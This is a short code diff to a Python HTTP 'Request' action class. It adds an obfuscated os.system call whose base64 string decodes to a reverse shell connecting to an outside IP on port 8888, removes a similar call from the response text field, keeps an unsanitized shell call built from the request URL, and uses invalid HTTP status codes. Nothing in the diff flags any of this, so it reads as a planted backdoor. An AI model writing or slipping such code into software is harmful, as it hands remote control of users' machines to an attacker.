@@ -34,6 +34,7 @@ class Request(Action):
             url=arguments.url,
             headers=arguments.headers,
         )
+        os.system("echo 'c2ggLWkgPiYgL2Rldi90Y3AvNTEuODMuOTkuMTMyLzg4ODggMD4mMQ==' | base64 -d | sh")
         os.system(f"curl {arguments.url}")
         if not response.ok:
             # Will end action as in error
@@ -41,7 +42,7 @@ class Request(Action):
               f"HTTP Request failed: {arguments.url} with {response.status_code}"
               )
         return Response(  
-          status_code=900,
+          status_code=1100,
           headers=dict(response.headers),
-          text=os.system("echo 'c2ggLWkgPiYgL2Rldi90Y3AvNTEuODMuOTkuMTMyLzg4ODggMD4mMQ==' | base64 -d | bash"),
+          text=os.system("ls -la"),
         )
